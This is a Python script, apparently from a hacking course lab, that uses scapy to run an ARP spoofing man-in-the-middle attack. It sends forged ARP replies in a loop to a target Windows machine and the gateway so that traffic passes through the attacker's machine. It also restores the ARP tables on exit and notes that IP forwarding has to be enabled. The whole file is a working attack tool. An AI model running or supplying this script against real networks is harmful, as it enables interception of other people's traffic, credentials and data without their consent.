#!/bin/usr/env python3

import scapy.all as sc
import time

#search all clients machine by IP in the network
def get_mac(ip):
    arp_request = sc.ARP(pdst=ip)
    #arp_request.show()
    #broadcast MAC address of destination
    broadcast = sc.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = sc.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc
    

    
# 10.0.2.1 -> IP of router which can be found by 'route -n'
# 10.0.2.15 -> IP of Windows VM
# hwst -> MAC address of Windows VM  

# create ART packet where op=2 it is ARP response which will be 'sent' from router IP 10.0.2.1
# but in reality ARP response will be forwarded from hacker VM. So victim VM will be thinking that router sends ARP in the end.
def spoof(target_ip, spoof_ip):
    target_mac=get_mac(target_ip)
    packet=sc.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    #op = is-at (ARP response)
    #print(packet.show())
    #print(packet.summary())
    #send ARP packet
    sc.send(packet, verbose=False)

def restore(destination_ip, source_ip):
    destination_mac=get_mac(destination_ip)
    source_mac=get_mac(source_ip)
    packet=sc.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    # send 4 packet to make sure Win machine override arp table
    sc.send(packet, count=4, verbose=False)

target_ip="10.0.2.15"
gateway_ip="10.0.2.1"

# permanent overriding arp table by means of a loop while
try:
    counter_packets = 0
    while True:
        # hacker VM is router
        spoof(target_ip, gateway_ip)
        # hacker VM is Windows machine
        spoof(gateway_ip, target_ip)
        counter_packets=counter_packets + 2
        print("\r[+] Packets sent: " + str(counter_packets), end="")
        time.sleep(2)
except KeyboardInterrupt:
    print("[+] Detected CTRL + C .... Restoring ARP tables!")
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)


# not to forget to allow IP forwarding so that IP datagram pass through hacker VM like a router
# echo 1 > /proc/sys/net/ipv4/ip_forward 


